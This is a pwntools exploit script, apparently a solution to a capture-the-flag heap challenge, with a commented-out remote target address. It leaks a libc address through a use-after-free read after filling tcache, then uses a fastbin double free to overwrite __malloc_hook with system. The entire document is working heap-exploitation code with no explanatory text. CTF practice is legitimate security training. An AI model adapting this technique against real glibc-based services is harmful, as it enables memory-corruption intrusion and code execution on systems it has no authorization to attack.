from pwn import *

p = process('./chall')
#p = remote('34.92.96.238',10001)
elf = ELF('./chall')
libc = ELF('./libc.so.6')
context.log_level = 'debug'

def add(size,name,call):
    p.recvuntil('choice:')
    p.sendline('1')
    p.recvuntil('name')
    p.sendline(str(size))
    p.recvuntil('name:')
    p.send(name)
    p.recvuntil('call:')
    p.send(call)

def show(idx):
    p.recvuntil('choice:')
    p.sendline('2')
    p.recvuntil('index:')
    p.sendline(str(idx))

def delete(idx):
    p.recvuntil('choice:')
    p.sendline('4')
    p.recvuntil('index:')
    p.sendline(str(idx))

for i in range(10):
    add(0x90,'A'*0x90,'A')
for i in range(7):
    delete(i)
delete(8)
show(8)
p.recvuntil('name:\n')
data = u64(p.recv(6).ljust(8,'\x00'))
libc_base = data - 4111520
system_addr = libc_base + libc.symbols['system']
malloc_addr = libc_base + libc.symbols['__malloc_hook']
print hex(libc_base)+','+hex(malloc_addr)

add(0x90,'A'*0x90,'A')
for i in range(10):
    add(0x60,'A'*0x60,'A')
for i in range(7):
    delete(i+11)
delete(18)
delete(19)
delete(18)

for i in range(7):
    add(0x60,'A'*0x60,'A')

add(0x60,p64(malloc_addr),'A')
add(0x60,'A'*0x60,'A')
add(0x60,'A'*0x60,'A')
add(0x60,p64(system_addr),'A')

gdb.attach(p)

p.interactive()
